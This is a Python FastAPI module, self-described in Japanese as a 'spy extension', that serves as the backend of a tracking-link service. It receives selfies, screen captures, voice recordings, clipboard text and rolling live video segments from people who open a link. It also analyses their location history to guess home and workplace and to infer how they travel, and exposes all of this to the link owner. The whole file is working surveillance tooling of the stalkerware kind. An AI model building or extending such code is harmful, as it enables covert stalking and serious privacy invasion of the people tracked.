"""スパイ拡張：自撮り・リアルタイム映像/音声・クリップボード・滞在ログ・拠点推定・移動手段。

v4:
  ・ライブ映像（20秒セグメント）の受け口 /s/{code}/vseg を追加
  ・最大30分ぶんを保持。再生用に /s/{code}/video/*.webm と /s/{code}/vseg.json を追加
"""
from __future__ import annotations

import base64, datetime as dt, json, math, os, re, time

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse, Response

from . import linktrack, tenancy
from .tenancy import db

router = APIRouter()

MAX_BYTES = int(float(os.getenv("SPY_MAX_MB", "4") or 4) * 1048576)
CAP_KINDS = ("selfie", "screen", "voice", "frame")
_EXT = {"image/jpeg": "jpg", "image/png": "png", "image/webp": "webp",
        "audio/webm": "webm", "audio/mp4": "m4a", "audio/ogg": "ogg",
        "audio/wav": "wav"}

# ---- ライブ映像（セグメント）設定 ----
VSEG_KEEP_SEC = int(float(os.getenv("VSEG_KEEP_MIN", "30") or 30) * 60)   # 保持する秒数
VSEG_MAX_MB = float(os.getenv("VSEG_MAX_MB", "12") or 12)                # 1セグメント上限
VSEG_MIME = {"webm": "video/webm", "mp4": "video/mp4",
             "ogg": "video/ogg", "m4a": "video/mp4"}


def _m():
    from . import main
    return main


async def auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat()


def _owner(code):
    from . import users
    o = users.owner_of_link(code)
    if o:
        tenancy.set_current(o)
    return o


def _dir(code):
    u = tenancy.get_current() or "_"
    d = os.path.join(tenancy.tenant_dir(u), "media", re.sub(r"[^a-z0-9_.-]", "", code))
    os.makedirs(d, exist_ok=True)
    return d


def _dec(data):
    m = re.match(r"^data:([^;,]+);base64,(.*)$", data or "", re.S)
    if m:
        return m.group(1), base64.b64decode(m.group(2))
    return "", base64.b64decode(data or "")


# ---------- 受け口 ----------

@router.post("/s/{code}/cap")
async def cap(code: str, request: Request):
    if not _owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    kind = str(body.get("kind") or "")
    if kind not in CAP_KINDS:
        return {"ok": False, "why": "kind"}
    mime, raw = _dec(body.get("data") or "")
    if not raw:
        return {"ok": False, "why": "empty"}
    if len(raw) > MAX_BYTES:
        return {"ok": False, "why": "too big"}
    hit = int(body.get("hit") or 0)
    vid = str(body.get("vid") or "")[:64]
    fname = f"{kind}_{int(time.time() * 1000)}_{vid[:8]}.{_EXT.get(mime, 'bin')}"
    with open(os.path.join(_dir(code), fname), "wb") as f:
        f.write(raw)
    with db.tx() as c:
        cur = c.execute(
            """INSERT INTO link_captures(code,hit_id,vid,kind,path,mime,bytes,meta,ts)
               VALUES(?,?,?,?,?,?,?,?,?)""",
            (code, hit, vid, kind, fname, mime, len(raw),
             json.dumps(body.get("meta") or {}, ensure_ascii=False), _now()))
        cid = cur.lastrowid
    if hit:
        col = "screen_cap" if kind == "screen" else kind
        try:
            db.update_hit(hit, **{col: fname})
        except Exception:
            pass
    return {"ok": True, "id": cid, "file": fname}


@router.post("/s/{code}/clip")
async def clip(code: str, request: Request):
    if not _owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    txt = str(body.get("text") or "")[:2000]
    hit = int(body.get("hit") or 0)
    if hit and txt:
        db.update_hit(hit, clip=txt)
    if txt:
        with db.tx() as c:
            c.execute("INSERT INTO link_events(code,hit_id,vid,kind,value,text,ts) "
                      "VALUES(?,?,?,?,?,?,?)",
                      (code, hit, str(body.get("vid") or "")[:64], "clip", len(txt),
                       txt, _now()))
    return {"ok": bool(txt)}


@router.post("/s/{code}/ev")
async def ev(code: str, request: Request):
    if not _owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    kind = str(body.get("kind") or "ev")[:24]
    hit = int(body.get("hit") or 0)
    value = float(body.get("value") or 0)
    text = str(body.get("text") or "")[:4000]
    with db.tx() as c:
        c.execute("INSERT INTO link_events(code,hit_id,vid,kind,value,text,ts) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (code, hit, str(body.get("vid") or "")[:64], kind, value, text, _now()))
    if hit:
        f = {}
        if kind in ("dwell", "exit"):
            f["dwell_ms"] = int(value)
            try:
                f["scroll"] = float(json.loads(text).get("scroll") or 0)
            except Exception:
                pass
        if kind == "device":
            try:
                f["visits"] = int(json.loads(text).get("visits") or 0)
            except Exception:
                pass
        if f:
            db.update_hit(hit, **f)
    return {"ok": True}


# ---------- ライブ映像（20秒セグメント） ----------

def _vdir(code):
    d = os.path.join(_dir(code), "vseg")
    os.makedirs(d, exist_ok=True)
    return d


def _vlist(code):
    d = _vdir(code)
    out = []
    try:
        for n in sorted(os.listdir(d)):
            p = os.path.join(d, n)
            if not os.path.isfile(p):
                continue
            if n.rsplit(".", 1)[-1] not in VSEG_MIME:
                continue
            st = os.stat(p)
            out.append({"name": n, "path": p, "ts": st.st_mtime, "bytes": st.st_size})
    except Exception:
        pass
    out.sort(key=lambda x: (x["ts"], x["name"]))
    return out


def _vprune(code):
    files = _vlist(code)
    if len(files) <= 2:
        return
    cut = time.time() - VSEG_KEEP_SEC
    for f in files[:-1]:
        if f["ts"] < cut:
            try:
                os.remove(f["path"])
            except Exception:
                pass


def _vsend(code, files):
    if not files:
        raise HTTPException(404)
    ext = files[0]["name"].rsplit(".", 1)[-1]
    buf = b"".join(open(f["path"], "rb").read() for f in files)
    return Response(buf, media_type=VSEG_MIME.get(ext, "video/webm"),
                    headers={"Cache-Control": "no-store"})


@router.post("/s/{code}/vseg")
async def vseg(code: str, request: Request, sid: str = "", vid: str = "",
               seq: int = 0, ext: str = "webm", hit: int = 0):
    if not _owner(code):
        return {"ok": False}
    raw = await request.body()
    if not raw:
        return {"ok": False, "why": "empty"}
    if len(raw) > VSEG_MAX_MB * 1048576:
        return {"ok": False, "why": "too big"}
    sid = re.sub(r"[^a-zA-Z0-9.-]", "", sid or "")[:32] or "s"
    vid = re.sub(r"[^a-zA-Z0-9]", "", vid or "")[:8] or "x"
    ext = ext if ext in VSEG_MIME else "webm"
    name = f"{sid}_{vid}_{int(seq):06d}.{ext}"
    try:
        with open(os.path.join(_vdir(code), name), "wb") as f:
            f.write(raw)
    except Exception as e:
        return {"ok": False, "why": repr(e)}
    with db.tx() as c:
        c.execute("INSERT INTO link_events(code,hit_id,vid,kind,value,text,ts) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (code, int(hit or 0), vid, "vseg", len(raw), name, _now()))
    _vprune(code)
    return {"ok": True, "file": name, "bytes": len(raw)}


@router.get("/s/{code}/vseg.json")
def vseg_list(code: str):
    if not _owner(code):
        raise HTTPException(404)
    files = _vlist(code)
    out = []
    for f in files:
        base = f["name"].rsplit(".", 1)[0]
        parts = base.split("_")
        out.append({
            "name": f["name"], "bytes": f["bytes"],
            "sid": parts[0] if parts else "",
            "vid": parts[1] if len(parts) > 1 else "x",
            "ts": dt.datetime.fromtimestamp(f["ts"], dt.timezone.utc).isoformat(),
            "url": f"/s/{code}/vseg/{f['name']}",
            "mime": VSEG_MIME.get(f["name"].rsplit(".", 1)[-1], "video/webm"),
        })
    return {"count": len(out), "keep_min": VSEG_KEEP_SEC // 60, "files": out}


@router.get("/s/{code}/vseg/{name}")
def vseg_file(code: str, name: str):
    if not _owner(code):
        raise HTTPException(404)
    safe = os.path.basename(name)
    p = os.path.join(_vdir(code), safe)
    if not os.path.exists(p):
        raise HTTPException(404)
    ext = safe.rsplit(".", 1)[-1]
    return FileResponse(p, media_type=VSEG_MIME.get(ext, "video/webm"),
                        headers={"Cache-Control": "no-store"})


@router.get("/s/{code}/video/{which}")
def video_any(code: str, which: str):
    """which = last（最新1本＝リアルタイム用） / all（保持ぶん全部＝最大30分）
       拡張子が付いていても付いていなくてもよい（Safariは拡張子で判断することがある）"""
    if not _owner(code):
        raise HTTPException(404)
    w = which.rsplit(".", 1)[0].lower()
    files = _vlist(code)
    if w == "last":
        files = files[-1:]
    return _vsend(code, files)


@router.get("/s/{code}/cap/{cid}")
def cap_file(code: str, cid: int):
    if not _owner(code):
        raise HTTPException(404)
    r = db.q1("SELECT * FROM link_captures WHERE id=? AND code=?", (cid, code))
    if not r:
        raise HTTPException(404)
    p = os.path.join(_dir(code), r["path"])
    if not os.path.exists(p):
        raise HTTPException(404)
    return FileResponse(p, media_type=r["mime"] or "application/octet-stream")


@router.get("/s/{code}/f/{name}")
def cap_name(code: str, name: str):
    if not _owner(code):
        raise HTTPException(404)
    safe = os.path.basename(name)
    p = os.path.join(_dir(code), safe)
    if not os.path.exists(p):
        raise HTTPException(404)
    mime = "audio/webm" if safe.startswith("voice") else "image/jpeg"
    return FileResponse(p, media_type=mime)


@router.get("/sw.js")
def service_worker():
    p = "static/sw.js"
    if not os.path.exists(p):
        p = os.path.join(os.getcwd(), "static", "sw.js")
    return FileResponse(p, media_type="application/javascript",
                        headers={"Service-Worker-Allowed": "/",
                                 "Cache-Control": "no-store"})


@router.get("/manifest.webmanifest")
def manifest():
    p = "static/manifest.webmanifest"
    if not os.path.exists(p):
        p = os.path.join(os.getcwd(), "static", "manifest.webmanifest")
    return FileResponse(p, media_type="application/manifest+json")


@router.get("/s/{code}/ping")
def ping(code: str, request: Request, hit: int = 0, sid: str = ""):
    if not _owner(code):
        return {"ok": 0}
    return {"ok": 1, "server": _now()}


# ---------- 解析 ----------

def _hav(a, b, c, d):
    R = 6371000.0
    p1, p2 = math.radians(a), math.radians(c)
    dp, dl = p2 - p1, math.radians(d - b)
    x = math.sin(dp / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(dl / 2) ** 2
    return 2 * R * math.asin(math.sqrt(x))


def _g(d, k, dv=None):
    try:
        v = d[k]
        return dv if v is None else v
    except (KeyError, IndexError, TypeError):
        return dv


def _insight(code):
    pts = [dict(r) for r in db.q(
        "SELECT id,ts,lat,lon,spd,city,src,mobile FROM track_points "
        "WHERE code=? AND lat IS NOT NULL ORDER BY id", (code,))]
    speeds, moved = [], 0.0
    for i in range(1, len(pts)):
        a, b = pts[i - 1], pts[i]
        try:
            t1 = dt.datetime.fromisoformat(a["ts"])
            t2 = dt.datetime.fromisoformat(b["ts"])
            dts = max(0.001, (t2 - t1).total_seconds())
        except Exception:
            continue
        d = _hav(a["lat"], a["lon"], b["lat"], b["lon"])
        if d < 3:
            continue
        moved += d
        v = (b["spd"] or 0) * 3.6 if (b["spd"] or 0) > 0.4 else d / dts * 3.6
        if 0 < v < 400:
            speeds.append(v)

    avg = sum(speeds) / len(speeds) if speeds else 0
    if not speeds:
        mode = "-"
    elif avg < 7:
        mode = "徒歩"
    elif avg < 20:
        mode = "自転車"
    elif avg < 90:
        mode = "車・バイク"
    else:
        mode = "電車・高速"

    grid = {}
    for p in pts:
        k = (round(p["lat"] / 0.005), round(p["lon"] / 0.005))
        g = grid.setdefault(k, {"n": 0, "lat": 0.0, "lon": 0.0, "night": 0,
                                "day": 0, "first": p["ts"], "last": p["ts"],
                                "city": p["city"] or "", "ip": 0})
        g["n"] += 1
        g["lat"] += p["lat"]
        g["lon"] += p["lon"]
        if (p.get("src") or "") == "ip":
            g["ip"] += 1
        try:
            h = dt.datetime.fromisoformat(p["ts"]).hour
        except Exception:
            h = 12
        if h >= 21 or h < 7:
            g["night"] += 1
        elif 9 <= h <= 18:
            g["day"] += 1
        g["last"] = p["ts"]
    spots = []
    for g in grid.values():
        if g["n"] < 2:
            continue
        g["lat"] /= g["n"]
        g["lon"] /= g["n"]
        g["label"] = ("自宅候補" if g["night"] > g["day"]
                      else "職場・学校候補" if g["day"] > g["night"] else "滞在地点")
        g["acc"] = ("IP推定" if g["ip"] > g["n"] / 2 else "GPS")
        spots.append(g)
    spots.sort(key=lambda x: -x["n"])

    rep = [dict(r) for r in db.q(
        """SELECT COALESCE(NULLIF(vid,''),ip) k, COUNT(*) n, MAX(ts) last,
                  MAX(device) device, MAX(city) city
           FROM link_hits WHERE code=? AND is_bot=0
           GROUP BY k HAVING n>1 ORDER BY n DESC LIMIT 20""", (code,))]

    caps = [dict(r) for r in db.q(
        "SELECT id,kind,ts,bytes,vid,hit_id FROM link_captures WHERE code=? "
        "ORDER BY id DESC LIMIT 200", (code,))]

    dwell = db.q1("SELECT COUNT(*) n, SUM(dwell_ms) s, MAX(scroll) m "
                  "FROM link_hits WHERE code=?", (code,)) or {}

    ip_only = sum(1 for p in pts if (p.get("src") or "") == "ip")
    mob = sum(1 for p in pts if _g(p, "mobile", 0))
    warn = ""
    if ip_only:
        warn = linktrack.IP_WARN + (f"（モバイル回線の点: {mob}件）" if mob else "")

    return {
        "points": len(pts), "moved_m": round(moved), "avg_kmh": round(avg, 1),
        "max_kmh": round(max(speeds), 1) if speeds else 0, "transport": mode,
        "spots": spots[:6], "repeaters": rep, "captures": caps,
        "ip_only": ip_only, "mobile_points": mob, "warn": warn,
        "dwell_ms": int(dwell["s"] or 0), "dwell_n": int(dwell["n"] or 0),
        "max_scroll": float(dwell["m"] or 0),
        "video": [{"name": f["name"], "ts": dt.datetime.fromtimestamp(
            f["ts"], dt.timezone.utc).isoformat(), "bytes": f["bytes"]}
            for f in _vlist(code)],
        "video_keep_min": VSEG_KEEP_SEC // 60,
    }


@router.get("/api/spy/{code}")
def api_spy(code: str):
    if not _owner(code):
        raise HTTPException(404)
    return _insight(code)


@router.get("/spy/{code}")
def spy_page(code: str, request: Request, u=Depends(auth)):
    if not _owner(code):
        raise HTTPException(404)
    if not db.link_get(code):
        raise HTTPException(404)
    return RedirectResponse(f"/track/{code}", status_code=302)